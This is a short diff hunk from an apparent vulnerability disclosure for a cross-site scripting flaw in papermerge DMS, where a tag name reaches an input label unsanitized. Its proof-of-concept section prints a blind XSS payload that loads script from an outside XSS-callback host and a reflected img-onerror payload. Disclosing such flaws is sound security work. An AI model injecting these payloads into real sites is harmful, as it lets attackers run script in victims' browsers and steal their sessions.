@@ -9,7 +9,7 @@ XSS in papermerge DMS via rendering of unsanitized tag name in the input label.
 # Proof of Concept
 
 * XSS payloads Used for exploit :
-  * blind xss payload : ```"><script src=https://copp.xss.ht></script> ``` <use your own blind payloads>
+  * blind xss payload : ```"><script src=https://copp.xss.ht></script> ``` **use your own blind payloads**
   * Reflected XSS payload : ```<img src=x onerror=alert(1337)>```
 
 1. setup papermerge in your localhost 
